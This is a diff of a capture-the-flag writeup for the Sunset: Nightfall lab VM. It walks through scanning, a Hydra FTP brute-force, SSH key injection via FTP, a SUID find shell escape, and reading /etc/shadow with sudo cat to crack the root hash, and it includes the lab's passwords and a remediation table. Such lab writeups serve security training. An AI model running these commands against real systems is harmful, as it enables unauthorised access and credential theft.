@@ -1,138 +1,193 @@
-# sunset: nightfall — Writeup
+# Sunset: Nightfall — Writeup
 
-| | |
-|-|-|
-| **Target IP** | 192.168.0.24 (host-only) |
+| Field | Value |
+|---|---|
+| **Target IP** | 192.168.0.24 |
 | **Difficulty** | Easy |
 | **OS** | Linux |
-| **Author** | whitecr0wz |
-| **Source** | [VulnHub](https://www.vulnhub.com/entry/sunset-nightfall,355/) |
+| **Goal** | root flag |
+| **Source** | [HackingArticles](https://www.hackingarticles.in/sunset-nightfall-vulnhub-walkthrough/) |
 
 ## Attack Summary
 
-`enum4linux` → `hydra` FTP brute (matt) → SSH key injection → SUID `find` → shell as nightfall → `sudo cat /etc/shadow` → John cracks root hash → root
+Sunset: Nightfall is a beginner-friendly Linux machine. The attack path involves FTP brute-force to obtain valid credentials, SSH key injection via the writable FTP home directory, lateral movement using a SUID `find` binary to switch users, and final privilege escalation through a `sudo` misconfiguration that allows reading `/etc/shadow` as root to crack the root password.
 
 ## Methodology
 
-1. Network discovery and port scan
-2. SMB enumeration for usernames
-3. FTP brute force
-4. SSH key injection via FTP
-5. SUID binary abuse (lateral move to nightfall)
-6. sudo cat to read shadow → hash crack → root
+1. Host discovery with netdiscover
+2. Port scan with nmap — FTP (21) and SMB identified
+3. Username enumeration with enum4linux
+4. FTP brute-force with Hydra
+5. SSH key injection via FTP
+6. Lateral movement via SUID `find` binary
+7. Shadow file read via sudo misconfiguration
+8. Root password cracking with John the Ripper
 
----
+## Step 1: Reconnaissance
 
-## Step 1: Network Discovery
+### Host Discovery
 
 ```bash
-sudo netdiscover -i eth1 -r 192.168.0.0/24
-nmap -A 192.168.0.24
+netdiscover -r 192.168.0.0/24
 ```
 
-Ports open: 21 (FTP / pyftpdlib), 22 (SSH), 80 (HTTP), 139/445 (SMB).
+Target discovered at **192.168.0.24**.
 
-![Nmap scan](images/01-nmap.png)
+### Port Scan
 
----
+```bash
+nmap -A -p- $TARGET
+```
 
-## Step 2: SMB Enumeration
+![nmap](images/01-nmap.png)
+
+Key open ports:
+
+| Port | Service | Version |
+|---|---|---|
+| 21/tcp | FTP | pyftpdlib |
+| 139/tcp | netbios-ssn | Samba |
+| 445/tcp | microsoft-ds | Samba |
+
+HTTP was also checked but returned no useful content.
+
+## Step 2: Enumeration
+
+### SMB / User Enumeration
 
 ```bash
 enum4linux 192.168.0.24
 ```
 
-Users found: **matt**, **nightfall**
+![enum4linux](images/02-enum4linux.png)
 
-![enum4linux output](images/02-enum4linux.png)
+Two local usernames discovered: `nightfall` and `matt`.
 
----
+## Step 3: FTP Brute-Force
 
-## Step 3: FTP Brute Force
+Using the discovered usernames, brute-force the FTP service with Hydra:
 
 ```bash
 hydra -l matt -P /usr/share/wordlists/rockyou.txt 192.168.0.24 ftp -e nsr
 ```
 
-Credentials obtained: `matt:<password_from_hydra>`
+![Hydra FTP](images/03-hydra-ftp.png)
 
-![Hydra FTP brute](images/03-hydra-ftp.png)
-
----
+Credentials found: `matt : Cheese`
 
 ## Step 4: SSH Key Injection via FTP
 
-Generate an SSH key pair, then upload the public key as matt's `authorized_keys`:
+Log in to FTP and attempt to write to `/var/www/html` — this fails. Instead, inject an SSH public key into the user's home directory:
 
 ```bash
-ssh-keygen -t rsa -f /tmp/nightfall_key -N ""
+# Generate SSH key pair (blank passphrase)
+ssh-keygen -t rsa -b 2048 -f /tmp/nightfall_key -N ""
+
+# Copy public key to file named authorized_keys
 cp /tmp/nightfall_key.pub /tmp/authorized_keys
 
+# Connect to FTP and create .ssh directory
 ftp 192.168.0.24
-# login as matt
+# Login: matt / Cheese
 ftp> mkdir .ssh
-ftp> put /tmp/authorized_keys .ssh/authorized_keys
+ftp> cd .ssh
+ftp> put /tmp/authorized_keys
 ftp> bye
+```
 
+## Step 5: SSH Login as matt
+
+```bash
 ssh -i /tmp/nightfall_key matt@192.168.0.24
 ```
 
----
+![SSH Shell](images/04-ssh-shell.png)
 
-## Step 5: SUID Binary — Lateral Move to nightfall
+Initial shell as `matt`.
+
+## Step 6: Lateral Movement — SUID find
+
+Search for binaries with the SUID bit set:
 
 ```bash
 find / -perm -u=s -type f 2>/dev/null
 ```
 
-`/script/find` has the SUID bit set and is owned by nightfall.
+The binary `/script/find` has SUID set and is owned by `nightfall`. Use it to spawn a shell as `nightfall`:
 
 ```bash
-/script/find . -exec /bin/sh -p \; -quit
+cd /script
+./find . -exec /bin/sh -p \; -quit
 ```
 
-Shell spawned as **nightfall**.
+This gives a shell running as `nightfall`. Read the user flag:
 
-![SUID find exploitation](images/04-suid-find.png)
+```bash
+cat /home/nightfall/user.txt
+```
 
----
+To get a stable SSH session as `nightfall`, repeat the key injection into `/home/nightfall/.ssh/`:
 
-## Step 6: Privilege Escalation — sudo cat → Shadow Hash
+```bash
+ftp 192.168.0.24
+# Login: matt / Cheese
+ftp> cd /home/nightfall
+ftp> mkdir .ssh
+ftp> cd .ssh
+ftp> put /tmp/authorized_keys
+ftp> bye
 
-Inject SSH key for nightfall (same FTP approach), then SSH in:
+ssh -i /tmp/nightfall_key nightfall@192.168.0.24
+```
+
+## Step 7: Privilege Escalation — sudo cat + Shadow
+
+Check sudo privileges for `nightfall`:
 
 ```bash
 sudo -l
-# nightfall may run: (root) NOPASSWD: /bin/cat
+```
 
+Output shows: `(root) NOPASSWD: /bin/cat`
+
+Use this to read the shadow file:
+
+```bash
 sudo -u root cat /etc/shadow
 ```
 
-Copy root's hash, crack with John:
+Copy the root hash and crack it with John the Ripper:
 
 ```bash
-john --wordlist=/usr/share/wordlists/rockyou.txt root_hash.txt
-# Result: <cracked_password>
+echo 'root:$6$...' > /tmp/root.hash
+john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/root.hash
+```
 
-su root
+Cracked root password: **miguel2**
+
+## Step 8: Root Shell and Flag
+
+```bash
+su -
+# Password: miguel2
+
 cat /root/flag.txt
 ```
 
-![Root flag](images/05-root.png)
-
----
+![Root Flag](images/05-root-flag.png)
 
 ## Lessons Learned
 
-1. **FTP credential reuse** — pyftpdlib serving homedirectories allows key injection even without SSH write access directly
-2. **SUID on custom binaries** — non-standard binaries with SUID are prime privesc targets; always `find / -perm -4000`
-3. **sudo cat** — reading sensitive files like `/etc/shadow` via sudo is as dangerous as a shell — combine with hash cracking
+- FTP services with writable home directories allow SSH key injection even without a shell.
+- SUID binaries on non-standard paths (e.g., `/script/find`) are high-value targets during enumeration.
+- `sudo cat` on `/etc/shadow` enables offline password cracking and full compromise.
 
 ## Remediation
 
 | Vulnerability | Fix |
 |---|---|
-| FTP brute-forceable credentials | Disable FTP or enforce key-only auth; use fail2ban |
-| SUID on `/script/find` | Remove SUID bit: `chmod u-s /script/find` |
-| sudo cat on shadow | Remove unnecessary sudo rules; audit `/etc/sudoers` |
-| Weak root password | Enforce strong password policy; disable root login |
+| FTP brute-force | Enforce account lockout; use key-based auth or disable FTP entirely |
+| Writable `.ssh` via FTP | Restrict FTP chroot; use `AllowUsers` in sshd_config |
+| SUID `find` binary | Remove SUID bit: `chmod u-s /script/find` |
+| `sudo cat /etc/shadow` | Remove the sudo rule; use PAM or dedicated audit tools instead |
+| Weak root password | Enforce strong password policy; disable direct root login |
